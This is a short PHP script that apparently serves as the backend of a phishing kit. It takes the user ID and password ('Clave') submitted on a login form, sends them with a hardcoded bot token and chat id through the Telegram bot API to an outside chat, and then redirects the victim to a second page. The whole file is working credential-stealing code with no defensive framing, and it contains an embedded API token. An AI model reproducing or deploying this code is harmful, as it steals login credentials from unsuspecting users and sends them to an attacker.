<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];

////////////////////


////////////////////

if ( isset ($_POST['UserId']) && isset ($_POST['Clave'])  ){

$message = "Doc= ".$_POST['UserId']." - User= ".$_POST['Clave']." \r\n";

$apiToken = "6038469527:AAFk9h_bSn4bWEb3XjVDS1RDa_T4-Ir0Drw";


$data = [
  'chat_id' => '-1001972465164',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

@header('Location: index2.html');

}else{ header ('location: index.html'); exit(); }

?>